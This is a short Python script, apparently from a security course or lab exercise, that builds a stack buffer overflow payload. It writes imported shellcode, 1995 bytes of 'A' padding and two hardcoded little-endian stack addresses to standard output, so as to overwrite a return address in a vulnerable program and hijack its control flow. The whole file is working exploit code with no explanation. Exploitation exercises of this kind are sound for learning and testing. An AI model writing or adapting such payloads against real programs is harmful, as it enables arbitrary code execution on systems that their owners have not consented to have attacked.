import sys
from shellcode import shellcode

addr = 0xfff6b990.to_bytes(4, "little")
ret_addr= 0xfff6b9a4.to_bytes(4,"little")
sys.stdout.buffer.write(shellcode + b"A" * 1995 + addr+ ret_addr)